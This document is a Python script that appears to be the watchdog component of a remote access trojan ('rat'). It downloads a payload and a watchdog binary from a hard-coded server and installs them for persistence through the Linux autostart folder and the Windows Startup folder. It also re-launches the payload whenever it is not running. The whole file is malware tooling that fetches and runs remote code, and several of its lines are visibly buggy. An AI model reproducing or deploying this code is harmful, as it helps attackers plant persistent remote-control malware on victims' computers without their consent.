import subprocess
import psutil
import time
import os
import platform
import requests
import shutil
import getpass

OS = platform.uname()[0]

### NAME OF PAYLOAD AND WATCHDOG FILES YOU CAN NAME ANYTHING YOU WANT, DO NOT INCLUDE EXTENTIONS EX. .EXE OR .BIN
_PAYLOAD_NAME = "payload"
_WATCHDOG_NAME = "watchdog"

### IF AUTO START == 1, WATCHDOG WILL CHECK THAT IT IS RUNNING IN AUTOSTART MODE
_AUTOSTART_WATCHDOG = 1

### ADDRESS TO THE WEBSERVER
_WEB_SERVER = "192.168.1.6:5000"


### DOWNLOAD LINKS FOR PAYLOAD AND WATCH DOG
if OS == "Linux":
    _PAYLOAD_LINK = "http://{0}/downloads/linux/payload".format(_WEB_SERVER)
    _WATCHDOG_LINK = "http://{0}/downloads/linux/watchdog".format(_WEB_SERVER)
    
elif OS == "Windows":
    _PAYLOAD_LINK = "http://{0}/downloads/windows/payload".format(_WEB_SERVER)
    _WATCHDOG_LINK = "http://{0}/downloads/windows/watchdog".format(_WEB_SERVER)


if _AUTOSTART_WATCHDOG == 1:
    print("checking for startup file")
    if platform.uname()[0] == "Linux":
        if _WATCHDOG_NAME in os.listdir("/home/{0}/.config/".format(getpass.getuser())):
            print("watching dog is in startup")
            pass
        else:
            print("payload not found")
            try:
                print("file doesnt exists")
                requests.get(_WATCHDOG_LINK)
                r = requests.get(_WATCHDOG_LINK)
                file = open("./{0}".format(_WATCHDOG_NAME), 'wb')
                subprocess.Popen(["chmod", "+x", "{0}".format(_WATCHDOG_NAME)])
                file.write(r.content)
                file.close()
                shutil.move("./{0}", "/home/{1}/.config/".format(_WATCHDOG_NAME, getpass.getuser()))
                with open("{0}.desktop".format(_WATCHDOG_NAME), "w") as FILE:
                    _STARTUP_LINES = ["[Desktop Entry]", "Type=Application", "Version=1.0", "Name={0}".format(_WATCHDOG_NAME),
                     "Comment=none", "Exec=/home/{0}/.config/{1}".format(getpass.getuser(), _WATCHDOG_NAME), "StartupNotify=false",
                     "Terminal=false"]
                    for LINES in _STARTUP_LINES:
                        FILE.writelines(LINES + "\n")
                    FILE.close()
                shutil.move("./{0}.desktop".format(_WATCHDOG_NAME), "/home/{0}/.config/autostart".format(getpass.getuser()))
            except Exception as e:
                print(e)
                pass
    elif platform.uname()[0] == "Windows":
        print("windows pc")
        try:
            if "./{0}.exe".format(_WATCHDOG_NAME) in os.listdir("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(getpass.getuser())):
                print("watching dog is in startup")
                pass
            else:
                    print("file doesnt exists")
                    requests.get(_WATCHDOG_LINK)
                    r = requests.get(_WATCHDOG_LINK)
                    file = open("./{0}.exe".format(_WATCHDOG_NAME), 'wb')
                    file.write(r.content)
                    file.close()
                    shutil.move("./{0}.exe".format(_WATCHDOG_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(getpass.getuser()))
        except Exception as e:
            print(e)
            pass
        
while 1:
    RUNNING = 0
    time.sleep(5)
    for PROC in psutil.process_iter():
        if PROC.name() == "rat":
            print("rat is running")
            RUNNING = 1

### IF PAYLOAD NOT RUNNING CHECK IF EXISTS. IF NOT DOWNLOAD AND START
    if RUNNING == 0:
            try:
                if OS == "Linux":
                    if os.path.exists("/home/{0}/.config/{1}".format(getpass.getuser(), _PAYLOAD_NAME)):
                        subprocess.Popen(["chmod", "+x", "{0}".format(_PAYLOAD_NAME)])
                        subprocess.call("./home/{0}/.config/{0}".format(getpass.getuser(), _PAYLOAD_NAME))
                        print('spawned rat')
                    
                elif OS == "Windows":
                    print("winwin")
                    if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _PAYLOAD_NAME)):
                        subprocess.call("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _PAYLOAD_NAME))
                        print('spawned rat')

            except Exception as e:
                print(e)
                pass
    else:
            try:
                print("file doesnt exists")
                requests.get(_PAYLOAD_LINK)
                r = requests.get(_PAYLOAD_LINK)
                if OS == "Linux":
                    file = open("./{0}".format(_PAYLOAD_NAME), 'wb')
                elif OS == "Windows":
                    file = open("./{0}.exe".format(_PAYLOAD_NAME), 'wb')
                    
                file.write(r.content)
                file.close()
            except Exception as e:
                print(e)
                continue
                
            
